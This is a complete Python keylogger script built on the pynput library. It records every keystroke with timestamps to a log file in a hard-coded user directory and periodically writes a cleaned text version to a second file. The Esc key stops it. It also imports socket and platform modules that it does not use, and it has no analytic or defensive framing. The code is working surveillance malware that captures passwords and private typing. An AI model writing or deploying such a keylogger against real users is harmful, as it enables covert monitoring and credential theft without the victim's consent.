from pynput.keyboard import Key, Listener
import logging

import socket
import platform

import os

from multiprocessing import Process, freeze_support
# from PIL import ImageGrab


log_dir = r"/home/sirius/Documents/Logs/"
logging.basicConfig(filename = (log_dir + "keylog.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s')
count = 0
unsorted_data = []

# Record Keystrokes
def on_press(key):
  global count, unsorted_data
  logging.info(str(key))
  unsorted_data.append(str(key))
  count += 1
  if count >= 20:
    count = 0
    write_file(unsorted_data)
    unsorted_data = []

# Exit Function
def on_release(key):
  if key == Key.esc:
    return False

# Clean Data function
def write_file(unsorted_data):
  with open("sorted-data.txt", "a") as clean_file:
    for key in unsorted_data:
      clean_key = str(key).replace("'", "")
      if clean_key.find("space") > 0:
        clean_file.write('  ')
      elif clean_key.find("Key") == -1:
        clean_file.write(clean_key)


with Listener(on_press = on_press, on_release = on_release) as listener:
  listener.join()
